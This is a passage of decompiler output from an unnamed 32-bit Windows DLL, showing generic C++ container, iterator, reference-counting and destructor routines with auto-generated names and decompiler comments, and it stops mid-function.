// 100FC1B4: using guessed type int (__thiscall *off_100FC1B4)(void *Block, char);

//----- (100057B7) --------------------------------------------------------
void __thiscall sub_100057B7(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_100FC0B8;
  v5 = 1;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[7];
    sub_10005BB1(i);
  }
  v5 = -1;
  sub_100059B5(this);
}
// 100FC0B8: using guessed type int (__thiscall *off_100FC0B8)(void *, char);

//----- (1000581D) --------------------------------------------------------
_DWORD *__thiscall sub_1000581D(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_100FC1D4;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1D4: using guessed type int (__thiscall *off_100FC1D4)(void *Block, char);

//----- (10005883) --------------------------------------------------------
_DWORD *__thiscall sub_10005883(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_100FC1D4;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1D4: using guessed type int (__thiscall *off_100FC1D4)(void *Block, char);

//----- (100058E9) --------------------------------------------------------
_DWORD *__thiscall sub_100058E9(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_100FC1D4;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1D4: using guessed type int (__thiscall *off_100FC1D4)(void *Block, char);

//----- (1000594F) --------------------------------------------------------
_DWORD *__thiscall sub_1000594F(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_100FC1D4;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_1000728E(a2, (int)v3);
  return a2;
}
// 100FC1D4: using guessed type int (__thiscall *off_100FC1D4)(void *Block, char);

//----- (100059B5) --------------------------------------------------------
void *__thiscall sub_100059B5(_DWORD *this)
{
  void *result; // eax

  result = &loc_100A0EDD;
  *this = off_100FBF5C;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (100059D9) --------------------------------------------------------
int *__thiscall sub_100059D9(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( a3 )
  {
    v7 = a3;
    do
    {
      sub_10009E64(v6, *a2);
      --v7;
    }
    while ( v7 );
  }
  return a2;
}
// 10005A32: variable 'v6' is possibly undefined

//----- (10005A4D) --------------------------------------------------------
void __thiscall sub_10005A4D(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1000780D(v2);
}

//----- (10005A8B) --------------------------------------------------------
void __thiscall sub_10005A8B(void *this, int a2, int a3)
{
  int v3[2]; // [esp+0h] [ebp-14h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1000780D(v3);
}

//----- (10005ACC) --------------------------------------------------------
void __thiscall sub_10005ACC(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1000780D(v2);
}

//----- (10005B0A) --------------------------------------------------------
int __thiscall sub_10005B0A(void *this, int a2)
{
  int v2; // esi
  int v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1000780D(v4);
  return v2;
}

//----- (10005B4E) --------------------------------------------------------
void __thiscall sub_10005B4E(void *this)
{
  int v1[2]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1000780D(v1);
}

//----- (10005B95) --------------------------------------------------------
_DWORD *__thiscall sub_10005B95(_DWORD *Block, char a2)
{
  sub_10005258(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10005BB1) --------------------------------------------------------
int *__stdcall sub_10005BB1(int *Block)
{
  sub_10005EB3(Block);
  j__free(Block);
  return Block;
}

//----- (10005BE1) --------------------------------------------------------
void __fastcall sub_10005BE1(unsigned int a1, int a2, int a3)
{
  int v3; // edi
  int v4; // esi
  int v5; // eax
  _DWORD v6[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v3 = a1;
  if ( a1 < 0x10 )
    v3 = 16;
  *(_DWORD *)(a3 + 20) = 0;
  v4 = a3 + 4;
  (*(void (__thiscall **)(int))(*(_DWORD *)(a3 + 4) + 52))(a3 + 4);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v4 + 60))(v4, v3);
  for ( ; v3; --v3 )
  {
    sub_100066C2(v6);
    v7 = 0;
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v4 + 36))(v4, v5);
    v7 = -1;
    sub_100057B7(v6);
  }
}
// 10005C28: variable 'v5' is possibly undefined
// 10005BE1: using guessed type _DWORD var_1C[4];

//----- (10005C4A) --------------------------------------------------------
void *__thiscall sub_10005C4A(void *this, unsigned int a2)
{
  _DWORD *v3; // eax
  int v4; // edx
  _DWORD v6[6]; // [esp+8h] [ebp-24h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  if ( !a2 )
  {
    v3 = sub_1000E7F7(&a2, 1, 0);
    v7 = 0;
    sub_10007882((int)v3);
  }
  sub_100065B6((int)this, v6);
  v7 = 1;
  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 28))(this);
  sub_10005BE1(a2, v4, (int)this);
  sub_10006610((int)v6, (int)this);
  v7 = -1;
  return sub_10005258(v6);
}
// 10005C96: variable 'v4' is possibly undefined
// 10005C4A: using guessed type _DWORD var_24[6];

//----- (10005CC1) --------------------------------------------------------
int *__thiscall sub_10005CC1(void *this, int a2, int *a3)
{
  int (__thiscall **v4)(int, unsigned int); // esi
  unsigned int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // ecx
  int v9; // ecx
  volatile LONG *v11; // [esp-4h] [ebp-2Ch]
  int v12; // [esp+Ch] [ebp-1Ch] BYREF
  volatile LONG *lpAddend; // [esp+10h] [ebp-18h]
  int v14; // [esp+14h] [ebp-14h]
  int v15; // [esp+24h] [ebp-4h]

  v14 = 0;
  v4 = (int (__thiscall **)(int, unsigned int))(*(_DWORD *)(a2 + 4) + 44);
  v5 = sub_10005E2F((int)this, a2);
  v6 = (*v4)(a2 + 4, v5);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v6 + 12))(v6, &v12);
  v15 = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v12 + 4))(v12) )
  {
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v12 + 12))(v12);
    if ( !sub_1000D65C((int)this, v7 + 4) )
      break;
    sub_10009E64(v8, v12);
  }
  v9 = v12;
  v11 = lpAddend;
  a3[1] = (int)lpAddend;
  *a3 = v9;
  InterlockedIncrement(v11);
  v14 = 1;
  LOBYTE(v15) = 0;
  sub_1000780D(&v12);
  return a3;
}
// 10005D19: variable 'v8' is possibly undefined

//----- (10005D78) --------------------------------------------------------
int *__thiscall sub_10005D78(void *this, int a2, int *a3)
{
  int (__thiscall **v4)(int, unsigned int); // esi
  unsigned int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // ecx
  int v9; // ecx
  volatile LONG *v11; // [esp-4h] [ebp-2Ch]
  int v12; // [esp+Ch] [ebp-1Ch] BYREF
  volatile LONG *lpAddend; // [esp+10h] [ebp-18h]
  int v14; // [esp+14h] [ebp-14h]
  int v15; // [esp+24h] [ebp-4h]

  v14 = 0;
  v4 = (int (__thiscall **)(int, unsigned int))(*(_DWORD *)(a2 + 4) + 48);
  v5 = sub_10005E2F((int)this, a2);
  v6 = (*v4)(a2 + 4, v5);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v6 + 8))(v6, &v12);
  v15 = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v12 + 4))(v12) )
  {
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v12 + 12))(v12);
    if ( !sub_1000D65C((int)this, v7 + 4) )
      break;
    sub_10009E64(v8, v12);
  }
  v9 = v12;
  v11 = lpAddend;
  a3[1] = (int)lpAddend;
  *a3 = v9;
  InterlockedIncrement(v11);
  v14 = 1;
  LOBYTE(v15) = 0;
  sub_10007D7A((void **)&v12);
  return a3;
}
// 10005DD0: variable 'v8' is possibly undefined

//----- (10005E2F) --------------------------------------------------------
unsigned int __userpurge sub_10005E2F@<eax>(int a1@<ebx>, int a2)
{
  _DWORD *v2; // edi
  unsigned int v3; // eax
  int v5[5]; // [esp+8h] [ebp-2Ch] BYREF
  char v6[8]; // [esp+1Ch] [ebp-18h] BYREF
  unsigned int v7; // [esp+24h] [ebp-10h]
  int v8; // [esp+30h] [ebp-4h]

  v2 = (_DWORD *)sub_1000B261(a1, (int)v5, 0);
  v8 = 0;
  sub_10019445((int)v6);
  sub_10019459(v2, (int)v6);
  v8 = -1;
  sub_1000B3DF(v5);
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)(a2 + 4) + 4))(a2 + 4);
  return v7 % v3;
}
// 10005E2F: using guessed type int var_2C[5];

//----- (10005E90) --------------------------------------------------------
BOOL __thiscall sub_10005E90(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10005E9A) --------------------------------------------------------
int __thiscall sub_10005E9A(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10005EB3) --------------------------------------------------------
void __thiscall sub_10005EB3(int *this)
{
  *this = (int)&off_100FC0B0;
  sub_100079EC((int)(this + 3));
  sub_1000D3AD(this + 1);
}
// 100FC0B0: using guessed type int (__thiscall *off_100FC0B0)(void *Block, char);

//----- (10005EEF) --------------------------------------------------------
int __thiscall sub_10005EEF(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 12))(this[2]) + 4;
}

//----- (10005EFB) --------------------------------------------------------
int __thiscall sub_10005EFB(int *this)
{
  return sub_10009E64((int)this, this[2]);
}

//----- (10005F06) --------------------------------------------------------
void __noreturn sub_10005F06()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 478);
}
// 10005F06: using guessed type void __noreturn sub_10005F06();
// 10005F06: using guessed type char var_14[16];

//----- (10005F2B) --------------------------------------------------------
void __noreturn sub_10005F2B()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 479);
}
// 10005F2B: using guessed type char var_14[16];

//----- (10005F50) --------------------------------------------------------
int __thiscall sub_10005F50(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 4))(this[2]);
}

//----- (10005F58) --------------------------------------------------------
int __thiscall sub_10005F58(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 8))(this[2]);
}

//----- (10005F60) --------------------------------------------------------
int __thiscall sub_10005F60(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 12))(this[2]) + 12;
}

//----- (10005F6C) --------------------------------------------------------
int __thiscall sub_10005F6C(int *this)
{
  return sub_10006682((int)this, this[2]);
}

//----- (10005F77) --------------------------------------------------------
void __noreturn sub_10005F77()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 502);
}
// 10005F77: using guessed type char var_14[16];

//----- (10005F9C) --------------------------------------------------------
void __noreturn sub_10005F9C()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 503);
}
// 10005F9C: using guessed type char var_14[16];

//----- (10005FC1) --------------------------------------------------------
_DWORD *__stdcall sub_10005FC1(_DWORD *a1, int a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  char v5[8]; // [esp+Ch] [ebp-14h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  a1[1] = a2;
  *a1 = &off_100FC194;
  a1[2] = 0;
  a1[3] = 0;
  sub_1000728E(a1 + 4, 0);
  v6 = 0;
  v2 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(a1[1] + 4) + 44))(a1[1] + 4, a1[3]);
  v3 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v2 + 12))(v2, v5);
  LOBYTE(v6) = 1;
  sub_1000A219(a1 + 4, v3);
  LOBYTE(v6) = 0;
  sub_1000780D(v5);
  sub_10006700(a1);
  return a1;
}
// 100FC194: using guessed type int (__stdcall *off_100FC194)(char);

//----- (10006043) --------------------------------------------------------
BOOL __thiscall sub_10006043(int this)
{
  return *(_DWORD *)(this + 12) + 1 == (*(int (__thiscall **)(int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 4))(*(_DWORD *)(this + 4) + 4)
      && (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 4))(*(_DWORD *)(this + 16));
}

//----- (1000606E) --------------------------------------------------------
int __thiscall sub_1000606E(_DWORD **this)
{
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+4h] [ebp-10h] BYREF

  if ( ((unsigned __int8 (__thiscall *)(_DWORD **))(*this)[1])(this) )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  return (*(int (__thiscall **)(_DWORD *))(*this[4] + 12))(this[4]);
}

//----- (100060B2) --------------------------------------------------------
int __thiscall sub_100060B2(_DWORD *this)
{
  sub_10009E64((int)this, this[4]);
  ++this[2];
  return sub_10006700(this);
}

//----- (100060CB) --------------------------------------------------------
int __thiscall sub_100060CB(int *this)
{
  int *v2; // esi
  int v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  int result; // eax
  char v8[12]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v2 = this + 4;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)*v2 + 8))(*v2) )
  {
    v3 = this[1];
    v4 = (*(int (__thiscall **)(int, int))(*(_DWORD *)(v3 + 4) + 44))(v3 + 4, --this[3]);
    v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v4 + 20))(v4, v8);
    v9 = 0;
    sub_1000A219(v2, v5);
    v9 = -1;
    sub_1000780D(v8);
  }
  result = sub_10006682(v6, *v2);
  --this[2];
  return result;
}
// 1000613A: variable 'v6' is possibly undefined

//----- (10006154) --------------------------------------------------------
void __noreturn sub_10006154()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 439);
}
// 10006154: using guessed type char var_14[16];

//----- (10006179) --------------------------------------------------------
void __noreturn sub_10006179()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 441);
}
// 10006179: using guessed type char var_14[16];

//----- (1000619E) --------------------------------------------------------
int __thiscall sub_1000619E(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100061EB) --------------------------------------------------------
int __thiscall sub_100061EB(int this)
{
  int v2; // edi
  int result; // eax
  _DWORD *v4; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    v4 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v4);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10006233) --------------------------------------------------------
int __thiscall sub_10006233(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000626D) --------------------------------------------------------
int __thiscall sub_1000626D(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100062BA) --------------------------------------------------------
BOOL __thiscall sub_100062BA(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100062C3) --------------------------------------------------------
int __thiscall sub_100062C3(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 28);
  this[3] = result;
  return result;
}

//----- (10006302) --------------------------------------------------------
int __thiscall sub_10006302(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 32);
  this[2] = result;
  return result;
}

//----- (10006341) --------------------------------------------------------
int *__thiscall sub_10006341(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int *result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 28);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 28) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 32) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10005BB1(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (100063C9) --------------------------------------------------------
_DWORD *__thiscall sub_100063C9(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[7]; // [esp-24h] [ebp-3Ch] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x24u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000654F(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_10006776(Block, v6[0], v6[1], v6[2], v6[3], v6[4], v6[5], v6[6], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 28) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 32) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10006456) --------------------------------------------------------
void __thiscall sub_10006456(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_100FBF54;
  sub_1000E843(v2);
}
// 100FBF54: using guessed type int (__stdcall *off_100FBF54)(char);

//----- (1000646B) --------------------------------------------------------
void __thiscall sub_1000646B(int *this)
{
  sub_1000780D(this + 6);
  sub_1000D3AD(this);
}

//----- (100064A0) --------------------------------------------------------
int *__thiscall sub_100064A0(int *Block, char a2)
{
  sub_10005EB3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100064BC) --------------------------------------------------------
void **__thiscall sub_100064BC(void **this, char a2)
{
  sub_10007D7A(this + 2);
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}

//----- (100064F7) --------------------------------------------------------
int __thiscall sub_100064F7(int this, char a2)
{
  sub_1000780D((void *)(this + 16));
  if ( (a2 & 1) != 0 )
    j__free((void *)this);
  return this;
}

//----- (1000654F) --------------------------------------------------------
_DWORD *__thiscall sub_1000654F(_DWORD *this, _DWORD *a2)
{
  *a2 = &off_100FC0B0;
  sub_1000D372(a2 + 1, (int)(this + 1));
  sub_1000791E(this + 3, a2 + 3);
  return a2;
}
// 100FC0B0: using guessed type int (__thiscall *off_100FC0B0)(void *Block, char);

//----- (100065B6) --------------------------------------------------------
_DWORD *__userpurge sub_100065B6@<eax>(int a1@<esi>, _DWORD *a2)
{
  __int64 v2; // rax

  *a2 = off_100FBF5C;
  *a2 = &off_100FC07C;
  sub_100072D2(a2 + 1);
  v2 = ((__int64 (__thiscall *)(int))*(_DWORD *)(*(_DWORD *)a1 + 4))(a1);
  sub_10005BE1(v2, SHIDWORD(v2), (int)a2);
  sub_10006610(a1, (int)a2);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC07C: using guessed type int (__thiscall *off_100FC07C)(void *Block, char);

//----- (10006610) --------------------------------------------------------
void __usercall sub_10006610(int a1@<ecx>, int a2@<edi>)
{
  int v2; // eax
  int v3; // esi
  int v4; // eax
  int v5; // ecx
  void *v6[3]; // [esp+8h] [ebp-18h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 44))(a1, v6);
  v7 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v6[0] + 12))(v6[0]);
    v3 = (*(int (__thiscall **)(int, int))(*(_DWORD *)a2 + 16))(a2, v2 + 4);
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)v6[0] + 12))(v6[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 56))(v3, v4 + 12);
    sub_10009E64(v5, (int)v6[0]);
  }
  v7 = -1;
  sub_10007D7A(v6);
}
// 10006658: variable 'v5' is possibly undefined

//----- (10006682) --------------------------------------------------------
int __usercall sub_10006682@<eax>(int a1@<ecx>, int a2@<esi>)
{
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 8))(a2, a1) )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    v4[0] = 119;
    sub_100078FE((int)v2);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 20))(a2);
  return a2;
}

//----- (100066C2) --------------------------------------------------------
void __thiscall sub_100066C2(_DWORD *this)
{
  *this = off_100FBF5C;
  *this = &off_100FC0B8;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 100FC0B8: using guessed type int (__thiscall *off_100FC0B8)(void *, char);

//----- (10006700) --------------------------------------------------------
int __usercall sub_10006700@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax
  int v2; // eax
  int v3; // eax
  _DWORD *v4; // eax
  char v5[8]; // [esp+0h] [ebp-14h] BYREF
  int v6; // [esp+10h] [ebp-4h]

  for ( result = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
        !(_BYTE)result;
        result = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) )
  {
    result = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[4] + 4))(a1[4]);
    if ( !(_BYTE)result )
      break;
    v2 = a1[1];
    v3 = (*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(v2 + 4) + 44))(v2 + 4, ++a1[3]);
    v4 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 12))(v3, v5);
    v6 = 0;
    sub_1000A219(a1 + 4, v4);
    v6 = -1;
    sub_1000780D(v5);
  }
  return result;
}

//----- (10006776) --------------------------------------------------------
_DWORD *__stdcall sub_10006776(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10)
{
  sub_1000654F(&a2, a1);
  a1[7] = a9;
  a1[8] = a10;
  sub_10005EB3(&a2);
  return a1;
}

//----- (100067BE) --------------------------------------------------------
bool __thiscall sub_100067BE(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100067D5) --------------------------------------------------------
void __thiscall sub_100067D5(_DWORD *this)
{
  sub_1000D17D(this, &word_1017DB80);
  sub_1000728E(this + 6, 0);
}

//----- (10006814) --------------------------------------------------------
_DWORD *__stdcall sub_10006814(_DWORD *a1)
{
  sub_1000A901(a1);
  *a1 = &off_100FBF60;
  sub_100080F2(a1, 16);
  return a1;
}
// 100FBF60: using guessed type int (__thiscall *off_100FBF60)(void *Block, char);

//----- (10006851) --------------------------------------------------------
int *__thiscall sub_10006851(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
